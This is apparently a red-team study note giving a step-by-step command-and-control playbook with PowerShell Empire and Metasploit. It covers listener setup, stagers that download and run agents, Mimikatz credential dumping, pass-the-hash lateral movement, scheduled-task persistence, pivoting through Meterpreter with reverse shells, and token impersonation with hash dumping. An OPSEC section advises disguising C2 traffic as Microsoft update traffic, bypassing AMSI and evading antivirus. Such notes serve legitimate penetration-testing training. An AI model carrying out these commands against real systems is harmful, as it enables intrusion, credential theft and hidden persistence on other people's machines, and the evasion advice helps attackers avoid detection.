---
title: Command and Control (C2-C&C)
draft: false
tags:
  - red-teaming
  - c2
  - post-exploitation
  - powershell
  - windows
  - lateral-movement
---

Command and Control (C2 or C&C) refers to the infrastructure and techniques used by an attacker to communicate with and control compromised systems after initial access. The C2 channel is the persistent communication link between the attacker's server and the implant/agent running on the victim machine.

**Common C2 frameworks:** PowerShell Empire, Cobalt Strike, Sliver, Havoc, Metasploit (basic), Covenant.

> [!Requirements]
> - Initial access on a target (shell, RCE, or macro execution)
> - See [[Phishing with Microsoft Office]] and [[Client-Side Attacks]] for initial access techniques

---
# PowerShell Empire & Starkiller

PowerShell Empire is an open-source post-exploitation framework. Starkiller is its GUI frontend. Empire uses **agents** (implants on victim machines) that communicate with a **listener** on the attacker's C2 server over HTTP/HTTPS.

## Installation
```sh
$ sudo apt-get update && apt-get install powershell-empire
```

## Server & Client Setup
```bash
# Terminal 1 — start the Empire server (backend)
$ sudo powershell-empire server

# Terminal 2 — connect the client (CLI)
$ powershell-empire client
```

## Step 1 — Setup a Listener
```powershell
empire> uselistener http
empire> set Host http://LHOST        # attacker's C2 server URL
empire> set Port LPORT               # listening port (e.g. 80, 443)
empire> execute
empire> main                         # deselect module
empire> listeners                    # verify listener is active
```

> [!Note]
> Use `uselistener https` with a valid (or self-signed) certificate on port 443 for better evasion. HTTP traffic to an uncommon port is easier to detect.

## Step 2 — Generate & Deploy a Stager
A stager is a small PowerShell payload that, when executed on the victim, downloads and runs the full agent.

```powershell
empire> usestager multi/launcher
empire> set Listener LISTENER_NAME   # name of the listener created above
empire> execute                      # generates a PSH one-liner
```

Copy the generated PowerShell one-liner and execute it on the compromised target (via the initial access shell, RCE, or macro).

```powershell
empire> main
empire> agents                       # wait for agent to check in
empire> rename OLD_NAME NEW_NAME     # give agent a meaningful name
empire> interact AGENT_NAME          # enter agent shell
```

## Step 3 — Interacting with an Agent
```powershell
# General
empire> help                         # list all commands
empire> shell "whoami /all"          # execute OS command on victim
empire> history                      # view previous commands and output

# Situational Awareness
empire> usemodule powershell/situational_awareness/host/winenum
empire> set Agent AGENT_NAME
empire> execute                      # enumerate host and current user info

empire> usemodule powershell/situational_awareness/host/computerdetails
empire> set Agent AGENT_NAME
empire> execute

empire> usemodule powershell/situational_awareness/network/portscan
empire> set Host INTERNAL_IP         # scan internal network from victim
empire> set Agent AGENT_NAME
empire> execute
```

## Step 4 — Privileged Modules (requires admin/SYSTEM)
```powershell
# Dump credentials via Mimikatz
empire> usemodule powershell/credentials/mimikatz/lsadump
empire> set Agent AGENT_NAME
empire> execute
```

## Step 5 — Lateral Movement
```powershell
# Pass-the-Hash via SMBExec
empire> usemodule powershell/lateral_movement/invoke_smbexec
empire> set Username Administrator
empire> set Hash NTLM_HASH
empire> set Command "COMMAND"
empire> execute
```

## Step 6 — Persistence
```powershell
# Scheduled task persistence (requires elevated privileges)
empire> usemodule powershell/persistence/elevated/schtasks
empire> set Agent AGENT_NAME
empire> execute
```

---
# Pivoting: Empire + Metasploit

Use when you need to pivot to an internal network segment not directly reachable from the C2 server.

## Identify Internal Open Ports
```powershell
empire> usemodule powershell/situational_awareness/network/portscan
empire> set Host INTERNAL_IP
empire> set Agent AGENT_NAME
empire> execute
```

## Get a Meterpreter Session via Empire Agent
```sh
# On MSF — set up a web_delivery exploit to deliver a Meterpreter stager
msf> use exploit/multi/script/web_delivery
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST LOCAL_HOST
msf> set target 2                    # PowerShell target
msf> exploit
# Copy the generated WEB_DELIVERY_URL
```

```powershell
# On Empire — deliver the MSF payload through the existing agent
empire> usemodule powershell/code_execution/invoke_metasploitpayload
empire> set URL WEB_DELIVERY_URL
empire> execute
# Wait for the Meterpreter session to open in MSF
```

## Setup a SOCKS Proxy via Meterpreter
```sh
# Add routes to the internal network through the Meterpreter session
msf> use post/multi/manage/autoroute
msf> set SESSION SESSION_ID
msf> run

# Start SOCKS proxy for proxychains
msf> use auxiliary/server/socks_proxy
msf> set SRVHOST LOCAL_IP
msf> run
# Now use proxychains to reach internal hosts
```

## Exploit the Internal Target Through the Pivot
```sh
msf> use exploit/windows/http/badblue_passthru
msf> set LPORT LOCAL_PORT
msf> set RHOSTS INTERNAL_IP
msf> set payload windows/meterpreter/bind_tcp  # bind_tcp because we're reaching in via proxy
msf> exploit
```

## Escalate Privileges on Internal Target
```sh
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter> pgrep lsass
meterpreter> migrate LSASS_PID      # migrate into lsass for stability
meterpreter> hashdump               # dump local hashes
```

> [!Warning] OPSEC
> - HTTP Empire listeners on non-standard ports generate obvious traffic — use port 80/443 and a believable `Host` header (e.g., `updates.microsoft.com`).
> - `mimikatz/lsadump` is heavily signatured — consider using AMSI bypass or an obfuscated Mimikatz variant first.
> - `invoke_metasploitpayload` drops a PowerShell stager that is commonly detected. Use an obfuscated or stageless payload when AV is active.
> - Migrating into `lsass.exe` is high-risk and noisy — prefer migrating into `explorer.exe` or `svchost.exe` for persistence.
> - Use [[AV Evasion]] techniques before running post-exploitation modules on a hardened target.

---
# Related Notes
- [[Client-Side Attacks]] — initial access techniques to get the first shell
- [[Phishing with Microsoft Office]] — Office macro payloads for initial access
- [[AV Evasion]] — obfuscation and evasion before/during C2 operations
